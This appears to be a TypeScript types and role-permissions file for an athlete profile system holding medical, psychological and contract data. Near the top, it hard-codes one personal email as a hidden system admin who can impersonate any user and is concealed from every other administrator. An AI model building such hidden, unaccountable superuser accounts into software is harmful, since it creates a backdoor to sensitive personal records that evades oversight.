// Database Types for Athlete Profile Performance System

// Role hierarchy: system_admin > super_admin > admin > other roles
// system_admin is completely hidden from all users below - they cannot see, manage, or know about system_admin
// ONLY system_admin has Switch User capability
export type UserRole =
  | 'system_admin'    // Highest level - hidden from everyone, has ALL permissions including Switch User
  | 'super_admin'     // Can manage all users except system_admin (cannot see system_admin)
  | 'admin'
  | 'doctor'
  | 'physiotherapist' // Physical therapist / معالج طبيعي
  | 'fitness_coach'
  | 'sport_coach'
  | 'nutritionist'
  | 'psychologist'
  | 'athlete'

// Role hierarchy levels for permission checking
export const ROLE_HIERARCHY: Record<UserRole, number> = {
  system_admin: 100,
  super_admin: 90,
  admin: 80,
  doctor: 60,
  physiotherapist: 55,
  fitness_coach: 50,
  sport_coach: 50,
  nutritionist: 50,
  psychologist: 50,
  athlete: 10,
}

// Check if user is System Admin (has ALL permissions)
export function isSystemAdmin(role: UserRole): boolean {
  return role === 'system_admin'
}

// The hidden system admin email - ONLY this user can use Switch User and is invisible to everyone
export const HIDDEN_SYSTEM_ADMIN_EMAIL = 'abdul.sejini@gmail.com'

// Check if user can use Switch User feature (ONLY the hidden system admin by email)
export function canSwitchUser(role: UserRole, email?: string): boolean {
  // Only the specific hidden admin can switch users
  return email?.toLowerCase() === HIDDEN_SYSTEM_ADMIN_EMAIL.toLowerCase()
}

// Check if a user should be hidden from the user list
export function isHiddenUser(email: string): boolean {
  return email.toLowerCase() === HIDDEN_SYSTEM_ADMIN_EMAIL.toLowerCase()
}

// Role display names
export const ROLE_DISPLAY_NAMES: Record<UserRole, string> = {
  system_admin: 'System Admin',
  super_admin: 'Super Admin',
  admin: 'Admin',
  doctor: 'Doctor',
  physiotherapist: 'Physiotherapist',
  fitness_coach: 'Fitness Coach',
  sport_coach: 'Sport Coach',
  nutritionist: 'Nutritionist',
  psychologist: 'Psychologist',
  athlete: 'Athlete',
}

// Get roles that a user can see based on their role
// IMPORTANT: system_admin is COMPLETELY hidden from everyone except system_admin
export function getVisibleRoles(currentUserRole: UserRole): UserRole[] {
  const allRoles: UserRole[] = [
    'system_admin', 'super_admin', 'admin', 'doctor', 'physiotherapist',
    'fitness_coach', 'sport_coach', 'nutritionist', 'psychologist', 'athlete'
  ]

  if (currentUserRole === 'system_admin') {
    return allRoles // System admin sees everyone including themselves
  }

  // All other roles (including super_admin) CANNOT see system_admin
  // system_admin is completely invisible to them
  return allRoles.filter(role => role !== 'system_admin')
}

// Check if a user can manage another user
export function canManageUser(managerRole: UserRole, targetRole: UserRole): boolean {
  // System admin can manage everyone
  if (managerRole === 'system_admin') return true

  // No one can manage system_admin except system_admin
  // system_admin is completely protected from all other users
  if (targetRole === 'system_admin') return false

  // Super admin can manage everyone except system_admin
  if (managerRole === 'super_admin') return true

  // Others can only manage roles below them
  return ROLE_HIERARCHY[managerRole] > ROLE_HIERARCHY[targetRole]
}

// Get users that can be switched to (ONLY for system_admin)
export function getSwitchableUsers(currentUserRole: UserRole, allUsers: User[]): User[] {
  // Only system_admin can switch users
  if (currentUserRole !== 'system_admin') {
    return []
  }

  // System admin can switch to any user
  return allUsers
}

export interface User {
  id: string
  email: string
  full_name: string
  phone?: string
  role: UserRole
  picture?: string
  is_active: boolean
  last_login?: string
  created_at: string
  updated_at: string
  created_by?: string
  // Permission-based access to athletes
  assigned_sports?: string[]  // Sports IDs the user can access (empty = all)
  assigned_squads?: string[]  // Squad IDs the user can access (empty = all)
}

// ==========================================
// PERMISSION SYSTEM
// ==========================================

// Roles that have full access to all athletes (admin roles)
export const FULL_ACCESS_ROLES: UserRole[] = ['system_admin', 'super_admin', 'admin']

// Check if user has full access to all athletes
export function hasFullAccess(role: UserRole): boolean {
  return FULL_ACCESS_ROLES.includes(role)
}

// Filter athletes based on user permissions
export function filterAthletesByPermission<T extends { sport: string; squad?: string }>(
  athletes: T[],
  user: User
): T[] {
  // Admin roles see all athletes
  if (hasFullAccess(user.role)) {
    return athletes
  }

  // If no specific assignments, user sees no athletes (strict security)
  const assignedSports = user.assigned_sports || []
  const assignedSquads = user.assigned_squads || []

  // If user has no assignments at all, they see nothing
  if (assignedSports.length === 0 && assignedSquads.length === 0) {
    return []
  }

  return athletes.filter(athlete => {
    // Check sport permission
    const hasSportAccess = assignedSports.length === 0 ||
      assignedSports.includes(athlete.sport) ||
      assignedSports.includes('all')

    // Check squad permission
    const hasSquadAccess = assignedSquads.length === 0 ||
      !athlete.squad ||
      assignedSquads.includes(athlete.squad) ||
      assignedSquads.includes('all')

    // Must have both sport AND squad access
    return hasSportAccess && hasSquadAccess
  })
}

// Check if user can access a specific athlete
export function canAccessAthlete<T extends { sport: string; squad?: string }>(
  athlete: T,
  user: User
): boolean {
  if (hasFullAccess(user.role)) {
    return true
  }

  const assignedSports = user.assigned_sports || []
  const assignedSquads = user.assigned_squads || []

  if (assignedSports.length === 0 && assignedSquads.length === 0) {
    return false
  }

  const hasSportAccess = assignedSports.length === 0 ||
    assignedSports.includes(athlete.sport) ||
    assignedSports.includes('all')

  const hasSquadAccess = assignedSquads.length === 0 ||
    !athlete.squad ||
    assignedSquads.includes(athlete.squad) ||
    assignedSquads.includes('all')

  return hasSportAccess && hasSquadAccess
}

export interface AthleteProfile {
  id: string
  user_id?: string
  picture?: string
  full_name: string
  gender: 'male' | 'female'
  nationality: string
  mobile_number: string
  date_of_birth: string
  age?: number
  education?: string
  social_status?: string
  has_kids: boolean
  no_of_kids?: number
  height: number
  weight: number
  smoker: boolean
  emergency_phone: string
  tshirt_size?: string
  short_size?: string
  goals?: string
  squad?: string
  sport: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Clinic {
  id: string
  athlete_id: string
  doctor_id: string
  medical_history?: string
  allergy?: string
  medical_treatment?: string
  blood_type?: string
  physiotherapist_soap?: string
  record?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Mindset {
  id: string
  athlete_id: string
  daily_mood: number // 1-10
  daily_stress: number // 1-10
  daily_anxiety: number // 1-10
  daily_training: number // 1-10
  daily_competitive_soul: number // 1-10
  fixed_sleep_hour: boolean
  socialized: boolean
  play_board_games: boolean
  play_egames: boolean
  relaxation_way?: string
  motivation_way?: string
  while_injured_do?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Mental {
  id: string
  athlete_id: string
  doctor_id: string
  commitment_in_time: number // 1-10
  respect: number // 1-10
  self_confidence: number // 1-10
  team_work: number // 1-10
  attitude_in_training: number // 1-10
  attitude_in_game: number // 1-10
  attitude_in_winning: number // 1-10
  attitude_in_losing: number // 1-10
  important_note?: string
  special_exercise_gym?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Fitness {
  id: string
  athlete_id: string
  doctor_id: string
  fitness_test_date: string
  fitness_test?: string
  muscle_strength_test?: string
  agility_test?: string
  flexibility_test?: string
  heart_beat_while_rest?: number
  muscle_weight?: number
  fat_percentage?: number
  bmr?: number
  plan?: string
  recommendation?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface InjuryRecord {
  id: string
  athlete_id: string
  doctor_id: string
  injury_date: string
  subjective?: string
  objective?: string
  assessments?: string
  treatment_plan?: string
  recommendation?: string
  doctor_opinion_decision?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Nutrition {
  id: string
  athlete_id: string
  doctor_id: string
  date: string
  current_weight: number
  target_weight?: number
  daily_calories?: number
  protein_g?: number
  carbs_g?: number
  fats_g?: number
  water_intake_l?: number
  meal_plan?: string
  supplements?: string
  restrictions?: string
  notes?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface SportCoach {
  id: string
  athlete_id: string
  coach_id: string
  evaluation_date: string
  technical_skills: number // 1-10
  tactical_awareness: number // 1-10
  physical_performance: number // 1-10
  game_reading: number // 1-10
  decision_making: number // 1-10
  training_attendance?: string
  training_performance?: string
  match_performance?: string
  areas_to_improve?: string
  strengths?: string
  overall_rating: number // 1-10
  coach_notes?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface PerformanceStats {
  id: string
  athlete_id: string
  date: string
  type: 'match' | 'training'
  minutes_played?: number
  goals_points?: number
  assists?: number
  sport_specific_stats?: Record<string, unknown>
  rating?: number // 1-10
  notes?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Contract {
  id: string
  athlete_id: string
  contract_start: string
  contract_end: string
  salary?: number
  bonuses?: string
  status: 'active' | 'expired' | 'pending'
  created_at: string
  updated_at: string
  updated_by?: string
}

export interface Attendance {
  id: string
  athlete_id: string
  date: string
  type: 'training' | 'match' | 'meeting' | 'other'
  status: 'present' | 'absent' | 'late' | 'injured' | 'excused'
  reason?: string
  notes?: string
  created_at: string
  updated_at: string
  updated_by?: string
}

// ==========================================
// ATHLETE STATUS SYSTEM
// ==========================================

// Athlete Status Types
export type AthleteStatus =
  | 'active'           // نشط - يتدرب ويلعب بشكل طبيعي
  | 'injured'          // مصاب - في فترة علاج
  | 'recovering'       // في مرحلة التعافي
  | 'suspended'        // موقوف - إيقاف إداري أو تأديبي
  | 'on_loan'          // معار لنادي آخر
  | 'transferred'      // منتقل - تم بيعه
  | 'retired'          // معتزل
  | 'released'         // تم فسخ عقده
  | 'inactive'         // غير نشط - أسباب أخرى

// Status Display Configuration
export const ATHLETE_STATUS_CONFIG: Record<AthleteStatus, {
  label: string
  labelAr: string
  color: string
  bgColor: string
  description: string
}> = {
  active: {
    label: 'Active',
    labelAr: 'نشط',
    color: 'text-green-500',
    bgColor: 'bg-green-500/20',
    description: 'Currently training and playing'
  },
  injured: {
    label: 'Injured',
    labelAr: 'مصاب',
    color: 'text-red-500',
    bgColor: 'bg-red-500/20',
    description: 'Currently injured and under treatment'
  },
  recovering: {
    label: 'Recovering',
    labelAr: 'في التعافي',
    color: 'text-orange-500',
    bgColor: 'bg-orange-500/20',
    description: 'Recovering from injury'
  },
  suspended: {
    label: 'Suspended',
    labelAr: 'موقوف',
    color: 'text-yellow-600',
    bgColor: 'bg-yellow-600/20',
    description: 'Administrative or disciplinary suspension'
  },
  on_loan: {
    label: 'On Loan',
    labelAr: 'معار',
    color: 'text-blue-500',
    bgColor: 'bg-blue-500/20',
    description: 'Loaned to another club'
  },
  transferred: {
    label: 'Transferred',
    labelAr: 'منتقل',
    color: 'text-purple-500',
    bgColor: 'bg-purple-500/20',
    description: 'Transferred to another club'
  },
  retired: {
    label: 'Retired',
    labelAr: 'معتزل',
    color: 'text-gray-500',
    bgColor: 'bg-gray-500/20',
    description: 'Retired from professional sports'
  },
  released: {
    label: 'Released',
    labelAr: 'مفسوخ العقد',
    color: 'text-gray-600',
    bgColor: 'bg-gray-600/20',
    description: 'Contract terminated'
  },
  inactive: {
    label: 'Inactive',
    labelAr: 'غير نشط',
    color: 'text-gray-400',
    bgColor: 'bg-gray-400/20',
    description: 'Inactive for other reasons'
  }
}

// Status Groups for filtering
export const ATHLETE_STATUS_GROUPS = {
  available: ['active', 'recovering'] as AthleteStatus[],
  unavailable: ['injured', 'suspended'] as AthleteStatus[],
  away: ['on_loan', 'transferred'] as AthleteStatus[],
  departed: ['retired', 'released', 'inactive'] as AthleteStatus[]
}

// ==========================================
// TREND SYSTEM
// ==========================================

export type TrendDirection = 'up' | 'down' | 'stable'

export interface TrendData {
  direction: TrendDirection
  percentage: number
  previousValue: number
  currentValue: number
}

export const TREND_CONFIG: Record<TrendDirection, {
  icon: string
  color: string
  label: string
}> = {
  up: { icon: '↑', color: 'text-green-500', label: 'Improving' },
  down: { icon: '↓', color: 'text-red-500', label: 'Declining' },
  stable: { icon: '→', color: 'text-yellow-500', label: 'Stable' }
}

// Calculate trend from history
export function calculateTrend(values: number[]): TrendData {
  if (values.length < 2) {
    return { direction: 'stable', percentage: 0, previousValue: values[0] || 0, currentValue: values[0] || 0 }
  }

  const current = values[values.length - 1]
  const previous = values[values.length - 2]
  const diff = current - previous
  const percentage = previous !== 0 ? Math.round((diff / previous) * 100) : 0

  let direction: TrendDirection = 'stable'
  if (percentage > 5) direction = 'up'
  else if (percentage < -5) direction = 'down'

  return { direction, percentage: Math.abs(percentage), previousValue: previous, currentValue: current }
}

// ==========================================
// ATHLETE RECORD HISTORY
// ==========================================

// Generic Record Entry for any module
export interface RecordEntry {
  id: string
  athlete_id: string
  module: 'fitness' | 'medical' | 'nutrition' | 'mental' | 'mindset' | 'injury' | 'coach_evaluation' | 'attendance'
  date: string
  overall_score?: number
  metrics: Record<string, number | string | boolean>
  notes?: string
  recorded_by: string
  created_at: string
}

// Simple Record Entry for UI display (history charts and tables)
export interface SimpleRecordEntry {
  id: string
  date: string
  score: number
  details?: Record<string, string | number | boolean>
}

// Athlete History Summary
export interface AthleteHistorySummary {
  athlete_id: string
  module: string
  total_records: number
  latest_record_date: string
  average_score: number
  trend: TrendData
  score_history: { date: string; score: number }[]
}

// Updated Athlete Profile with Status
export interface AthleteProfileExtended extends AthleteProfile {
  status: AthleteStatus
  status_updated_at?: string
  status_reason?: string
  jersey_number?: number
  position?: string
  preferred_foot?: 'left' | 'right' | 'both'

  // Performance Summary
  fitness_trend?: TrendData
  mental_trend?: TrendData
  nutrition_trend?: TrendData
  overall_trend?: TrendData

  // Latest Scores
  latest_fitness_score?: number
  latest_mental_score?: number
  latest_nutrition_score?: number
  latest_coach_rating?: number
}

// Status Change Log
export interface StatusChangeLog {
  id: string
  athlete_id: string
  previous_status: AthleteStatus
  new_status: AthleteStatus
  reason?: string
  changed_by: string
  changed_at: string
}

// ==========================================
// MODULE-SPECIFIC HISTORY INTERFACES
// ==========================================

export interface FitnessRecord extends Fitness {
  overall_score: number
}

export interface MentalRecord extends Mental {
  overall_score: number
}

export interface NutritionRecord extends Nutrition {
  compliance_score: number
}

export interface CoachEvaluationRecord extends SportCoach {
  // Already has overall_rating
}
